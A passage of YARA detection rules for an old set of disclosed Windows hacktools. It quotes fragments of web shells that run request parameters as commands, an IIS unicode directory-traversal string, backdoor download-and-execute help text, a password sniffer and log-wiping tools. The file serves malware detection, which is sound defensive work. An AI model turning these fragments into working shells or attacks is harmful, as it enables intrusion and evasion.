		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
		$s19 = "= Compress with ASPack" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIR {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
	strings:
		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
		$s3 = "if Request.Cookies(\"password\")=\"" ascii
		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s19 = "whichdir=Request(\"path\")" fullword ascii
	condition:
		all of them
}

rule sig_238_filespy {
	meta:
		description = "Disclosed hacktool set (old stuff) - file filespy.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 50
		hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
	strings:
		$s0 = "Hit [Enter] to begin command mode..." fullword ascii
		$s1 = "If you are in command mode," fullword ascii
		$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
		$s9 = "FileSpy.exe" fullword wide
		$s12 = "ERROR starting FileSpy..." fullword ascii
		$s16 = "exe\\filespy.dbg" fullword ascii
		$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
		$s19 = "Should be logging to screen..." fullword ascii
		$s20 = "Filmon:  Unknown log record type" fullword ascii
	condition:
		7 of them
}

rule ByPassFireWall_zip_Folder_Ie {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
	strings:
		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule EditKeyLogReadMe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
	strings:
		$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
		$s1 = "WinEggDrop.DLL" fullword ascii
		$s2 = "nc.exe" fullword ascii
		$s3 = "KeyLog.exe" fullword ascii
		$s4 = "EditKeyLog.exe" fullword ascii
		$s5 = "wineggdrop" fullword ascii
	condition:
		3 of them
}

rule PassSniffer_zip_Folder_readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
	strings:
		$s0 = "PassSniffer.exe" fullword ascii
		$s1 = "POP3/FTP Sniffer" fullword ascii
		$s2 = "Password Sniffer V1.0" fullword ascii
	condition:
		1 of them
}

rule sig_238_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.reg"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
	strings:
		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
		$s1 = "REGEDIT4" fullword ascii
		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
	condition:
		all of them
}

rule splitjoin {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
	strings:
		$s0 = "Not for distribution without the authors permission" fullword wide
		$s2 = "Utility to split and rejoin files.0" fullword wide
		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
		$s19 = "SplitJoin" fullword wide
	condition:
		all of them
}

rule EditKeyLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
	strings:
		$s1 = "Press Any Ke" fullword ascii
		$s2 = "Enter 1 O" fullword ascii
		$s3 = "Bon >0 & <65535L" fullword ascii
		$s4 = "--Choose " fullword ascii
	condition:
		all of them
}

rule PassSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
	strings:
		$s2 = "Sniff" fullword ascii
		$s3 = "GetLas" fullword ascii
		$s4 = "VersionExA" fullword ascii
		$s10 = " Only RuntUZ" fullword ascii
		$s12 = "emcpysetprintf\\" fullword ascii
		$s13 = "WSFtartup" fullword ascii
	condition:
		all of them
}

rule aspfile2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
	strings:
		$s0 = "response.write \"command completed success!\" " fullword ascii
		$s1 = "for each co in foditems " fullword ascii
		$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
		$s19 = "<title>Hello! Welcome </title>" fullword ascii
	condition:
		all of them
}

rule UnPack_rar_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
	strings:
		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
		$s1 = "Explorer.exe" fullword ascii
		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
		$s4 = "The Port Is Out Of Range" fullword ascii
		$s7 = "Fail To Set The Port" fullword ascii
		$s11 = "\\psapi.dll" fullword ascii
		$s20 = "TInject.Dll" fullword ascii

		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$x2 = "injectt.exe" fullword ascii
	condition:
		( 1 of ($x*) ) and ( 3 of ($s*) )
}

rule Jc_WinEggDrop_Shell {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
	strings:
		$s0 = "Sniffer.dll" fullword ascii
		$s4 = ":Execute net.exe user Administrator pass" fullword ascii
		$s5 = "Fport.exe or mport.exe " fullword ascii
		$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
		$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
		$s15 = ": Del www.exe                   " fullword ascii
		$s20 = ":Dir *.exe                    " fullword ascii
	condition:
		2 of them
}

rule aspbackdoor_asp1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
	strings:
		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
		$s15 = "sql=\"select * from scjh\" " fullword ascii
	condition:
		all of them
}

rule QQ_zip_Folder_QQ {
	meta:
		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
	strings:
		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
		$s4 = "QQ2000b.exe" fullword wide
		$s5 = "haoq@neusoft.com" fullword ascii
		$s9 = "QQ2000b.exe" fullword ascii
		$s10 = "\\qq2000b.exe" fullword ascii
		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
		$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
	condition:
		5 of them
}

rule UnPack_rar_Folder_TBack {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
		$s8 = "Shell                                 -->Get A Shell" fullword ascii
		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
		$s13 = "Online                                -->List All Connected IP" fullword ascii
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
		$s19 = "Reboot                                -->Reboot The System" fullword ascii
		$s20 = "Password Sniffering Is Not Running" fullword ascii
	condition:
		4 of them
}

rule sig_238_cmd_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
	strings:
		$s0 = "Process child = Runtime.getRuntime().exec(" ascii
		$s1 = "InputStream in = child.getInputStream();" fullword ascii
		$s2 = "String cmd = request.getParameter(\"" ascii
		$s3 = "while ((c = in.read()) != -1) {" fullword ascii
		$s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
	condition:
		all of them
}

rule RangeScan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
		$s9 = "Produced by isn0" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
	condition:
		3 of them
}

rule XYZCmd_zip_Folder_Readme {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Readme.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
	strings:
		$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
		$s20 = "XYZCmd V1.0" fullword ascii
	condition:
		all of them
}

rule ByPassFireWall_zip_Folder_Inject {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Inject.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
	strings:
		$s6 = "Fail To Inject" fullword ascii
		$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
		$s11 = " Successfully" fullword ascii
	condition:
		all of them
}

rule sig_238_sqlcmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 40
		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
	strings:
		$s0 = "Permission denial to EXEC command.:(" fullword ascii
		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
	condition:
		4 of them
}

rule ASPack_ASPACK {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide
	condition:
		all of them
}

rule sig_238_2323 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
	strings:
		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
		$s3 = "Failed to execute shell" fullword ascii
		$s5 = "/h   - Hide Window" fullword ascii
		$s7 = "Accepted connection from client at %s" fullword ascii
		$s9 = "Error %d: %s" fullword ascii
	condition:
		all of them
}

rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Install.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "95866e917f699ee74d4735300568640ea1a05afd"
	strings:
		$s1 = "http://go.163.com/sdemo" fullword wide
		$s2 = "Player.tmp" fullword ascii
		$s3 = "Player.EXE" fullword wide
		$s4 = "mailto:sdemo@263.net" fullword ascii
		$s5 = "S-Player.exe" fullword ascii
		$s9 = "http://www.BaiXue.net (" fullword wide
	condition:
		all of them
}

rule sig_238_TFTPD32 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
	condition:
		all of them
}

rule sig_238_iecv {
	meta:
		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
	strings:
		$s1 = "Edit The Content Of Cookie " fullword wide
		$s3 = "Accessories\\wordpad.exe" fullword ascii
		$s4 = "gorillanation.com" fullword ascii
		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
		$s12 = "http://nirsoft.cjb.net" fullword ascii
	condition:
		all of them
}

rule Antiy_Ports_1_21 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s7 = "AntiyPorts MFC Application" fullword wide
		$s20 = " @Stego:" fullword ascii
	condition:
		all of them
}

rule perlcmd_zip_Folder_cmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
	strings:
		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
		$s1 = "s/%20/ /ig;" fullword ascii
		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
		$s6 = "$execthis = $_;" fullword ascii
		$s7 = "system($execthis);" fullword ascii
		$s12 = "s/%2f/\\//ig;" fullword ascii
	condition:
		6 of them
}

rule aspbackdoor_asp3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
	strings:
		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
		$s14 = " Windows NT " fullword ascii
		$s16 = " WIndows 2000 " fullword ascii
		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
	condition:
		all of them
}

rule sig_238_FPipe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s3 = " -s    - outbound source port number" fullword ascii
		$s5 = "http://www.foundstone.com" fullword ascii
		$s20 = "Attempting to connect to %s port %d" fullword ascii
	condition:
		all of them
}

rule sig_238_concon {
	meta:
		description = "Disclosed hacktool set (old stuff) - file concon.com"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
	strings:
		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_regdll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file regdll.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
	strings:
		$s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
		$s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
		$s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
		$s5 = "Public Property Get oFS()" fullword ascii
	condition:
		all of them
}

rule CleanIISLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
	strings:
		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
		$s8 = "CleanIISLog Ver" fullword ascii
		$s9 = "msftpsvc" fullword ascii
		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
		$s16 = "Service %s Stopped." fullword ascii
		$s20 = "Process Log File %s..." fullword ascii
	condition:
		5 of them
}

rule sqlcheck {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
	strings:
		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
	condition:
		3 of them
}

rule sig_238_RunAsEx {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
	strings:
		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
		$s8 = "cmd.bat" fullword ascii
		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
		$s11 = "%s Execute Succussifully." fullword ascii
		$s12 = "winsta0" fullword ascii
		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
	condition:
		4 of them
}

rule sig_238_nbtdump {
	meta:
		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "Cerberus NBTDUMP" fullword ascii
		$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
		$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
		$s19 = "%s's password is %s</H3>" fullword wide
		$s20 = "%s's password is blank</H3>" fullword wide
	condition:
		5 of them
}

rule sig_238_Glass2k {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
	strings:
		$s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
		$s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
		$s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
		$s4 = "Glass2k.exe" fullword wide
		$s7 = "NeoLite Executable File Compressor" fullword ascii
	condition:
		all of them
}

rule SplitJoin_V1_3_3_rar_Folder_3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21409117b536664a913dcd159d6f4d8758f43435"
	strings:
		$s2 = "ie686@sohu.com" fullword ascii
		$s3 = "splitjoin.exe" fullword ascii
		$s7 = "SplitJoin" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
	strings:
		$s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
		$s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
		$s3 = "response.write \"<a href='index.asp'>" fullword ascii
		$s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
		$s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
		$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
		$s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
	condition:
		5 of them
}

rule aspbackdoor_entice {
	meta:
		description = "Disclosed hacktool set (old stuff) - file entice.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
	strings:
		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
	condition:
		all of them
}

rule FPipe2_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "891609db7a6787575641154e7aab7757e74d837b"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = " -s    - outbound connection source port number" fullword ascii
		$s3 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s4 = "http://www.foundstone.com" fullword ascii
		$s19 = "FPipe" fullword ascii
	condition:
		all of them
}

rule InstGina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5317fbc39508708534246ef4241e78da41a4f31c"
	strings:
		$s0 = "To Open Registry" fullword ascii
		$s4 = "I love Candy very much!!" ascii
		$s5 = "GinaDLL" fullword ascii
	condition:
		all of them
}

rule ArtTray_zip_Folder_ArtTray {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
	strings:
		$s0 = "http://www.brigsoft.com" fullword wide
		$s2 = "ArtTrayHookDll.dll" fullword ascii
		$s3 = "ArtTray Version 1.0 " fullword wide
		$s16 = "TRM_HOOKCALLBACK" fullword ascii
	condition:
		all of them
}

rule sig_238_findoor {
	meta:
		description = "Disclosed hacktool set (old stuff) - file findoor.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
	strings:
		$s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
		$s8 = "PASS hacker@hacker.com" fullword ascii
		$s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
		$s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
		$s11 = "http://isno.yeah.net" fullword ascii
	condition:
		4 of them
}

rule aspbackdoor_ipclear {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
	strings:
		$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
		$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
		$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
		$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
		$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
	condition:
		all of them
}

rule WinEggDropShellFinal_zip_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "2TInject.Dll" fullword ascii
		$s2 = "Windows Services" fullword ascii
		$s3 = "Findrst6" fullword ascii
		$s4 = "Press Any Key To Continue......" fullword ascii
	condition:
		all of them
}

rule sig_238_rshsvc {
	meta:
		description = "Disclosed hacktool set (old stuff) - file rshsvc.bat"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "fb15c31254a21412aecff6a6c4c19304eb5e7d75"
	strings:
		$s0 = "if not exist %1\\rshsetup.exe goto ERROR2" fullword ascii
		$s1 = "ECHO rshsetup.exe is not found in the %1 directory" fullword ascii
		$s9 = "REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll" fullword ascii
		$s10 = "copy %1\\rshsvc.exe" fullword ascii
		$s12 = "ECHO Use \"net start rshsvc\" to start the service." fullword ascii
		$s13 = "rshsetup %SystemRoot%\\system32\\rshsvc.exe %SystemRoot%\\system32\\rshsvc.dll" fullword ascii
		$s18 = "pushd %SystemRoot%\\system32" fullword ascii
	condition:
		all of them
}

rule gina_zip_Folder_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
	strings:
		$s0 = "NEWGINA.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "WlxActivateUserShell" fullword ascii
		$s6 = "WlxWkstaLockedSAS" fullword ascii
		$s13 = "WlxIsLockOk" fullword ascii
		$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s16 = "WlxShutdown" fullword ascii
		$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule superscan3_0 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
	strings:
		$s0 = "\\scanner.ini" fullword ascii
		$s1 = "\\scanner.exe" fullword ascii
		$s2 = "\\scanner.lst" fullword ascii
		$s4 = "\\hensss.lst" fullword ascii
		$s5 = "STUB32.EXE" fullword wide
		$s6 = "STUB.EXE" fullword wide
		$s8 = "\\ws2check.exe" fullword ascii
		$s9 = "\\trojans.lst" fullword ascii
		$s10 = "1996 InstallShield Software Corporation" fullword wide
	condition:
		all of them
}

rule sig_238_xsniff {
	meta:
		description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
